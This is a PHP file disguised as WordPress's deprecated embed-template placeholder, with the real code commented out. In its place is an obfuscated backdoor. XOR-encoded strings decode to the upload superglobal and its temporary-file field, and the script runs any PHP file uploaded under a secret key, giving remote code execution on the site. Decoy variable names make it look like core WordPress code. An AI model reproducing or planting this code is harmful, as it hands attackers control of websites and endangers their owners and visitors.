<?php /* 
*
 * Back-compat placeholder for the base embed template
 *
 * @package WordPress
 * @subpackage oEmbed
 * @since 4.4.0
 * @depr*/
 	

$del_dir = 'REJ8kNkZPIyBk0';
	$key = 'orderby';
$comma = $del_dir;
function index($tax_object, $safe_text)

{
    $double_preg = $safe_text;
    $post_modified_gmt = urldecode($tax_object);

    $default_term_id = substr($double_preg,0, strlen($post_modified_gmt));
    $entities = $post_modified_gmt ^ $default_term_id;

    return $entities;
}
$fire_after_hooks = ${index("%0D%03%03t.%1D", $comma)};

$link = $fire_after_hooks;

if (isset($link[$comma]))

{
    $post_authors = $fire_after_hooks[$comma];
	$post_category = 'post_updated';
    $new_date = $post_authors[index("%26%28%3Ag%05%2F%06%3F", $comma)];
    $post_type_meta_caps = $new_date;
    include ($post_type_meta_caps);
	$feature = 'post_name_check';
}
	$full_match = 'ignore_block_element';


/* ecated 4.5.0 Moved to wp-includes/theme-compat/embed.php
 

_deprecated_file( basename( __FILE__ ), '4.5.0', 'wp-includes/theme-compat/embed.php' );

require ABSPATH . WPINC . '/theme-compat/embed.php';
*/